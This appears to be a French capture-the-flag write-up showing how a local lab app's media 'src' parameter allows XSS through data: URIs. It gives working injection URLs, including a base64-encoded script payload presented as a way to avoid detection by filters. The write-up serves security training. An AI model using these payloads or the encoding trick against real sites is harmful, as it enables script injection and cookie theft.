# XSS via Data URI - Media Source Injection

## Description
Cette vulnérabilité exploite une injection XSS via le paramètre `src` de la page média, permettant d'exécuter du JavaScript arbitraire en utilisant des data URIs encodées en base64.

## Exploitation

### Étape 1: Découverte de la faille
En cliquant sur l'image du logo NSA, nous sommes redirigés vers une page spéciale :

```
http://localhost:8080/?page=media&src=nsa
```

### Étape 2: Analyse du comportement
Le paramètre `src` semble être utilisé directement pour charger et afficher le contenu du fichier spécifié, sans validation appropriée côté serveur.

### Étape 3: Test d'injection XSS basique
Première tentative d'injection JavaScript directe :

```
http://localhost:8080/index.php?page=media&src=data:text/html,<script>alert("hack")</script>
```

**Problèmes de cette approche :**
- ❌ **Trop flagrant** : Le code JavaScript est visible dans l'URL
- ❌ **Facilement détectable** : Par les filtres de sécurité

### Étape 4: Encodage en Base64 pour la discrétion
Pour rendre l'attaque plus discrète, nous encodons le payload JavaScript en base64 :

**Payload original :**
```javascript
<script>alert("scrouch")</script>
```

**Encodage en base64 :**
```bash
echo '<script>alert("scrouch")</script>' | base64
# Résultat: PHNjcmlwdD5hbGVydCgic2Nyb3VjaCIpPC9zY3JpcHQ+
```

**URL finale d'exploitation :**
```
http://localhost:8080/index.php?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgic2Nyb3VjaCIpPC9zY3JpcHQ+
```

### Étape 5: Obtention du flag
Avec cette URL encodée, l'application exécute le JavaScript et nous donne le flag.

## Processus technique

### Comprendre les Data URIs
```
data:[<mediatype>][;base64],<data>

Exemples:
data:text/html,<h1>Hello</h1>
data:text/html;base64,PGgxPkhlbGxvPC9oMT4=
data:image/png;base64,iVBORw0KGgoAAAANS...
```

## Impact

Cette vulnérabilité permet :
- **Cross-Site Scripting (XSS)** : Exécution de JavaScript arbitraire
- **Vol de cookies** : Récupération des informations d'authentification
- **Redirection malveillante** : Détournement vers des sites de phishing
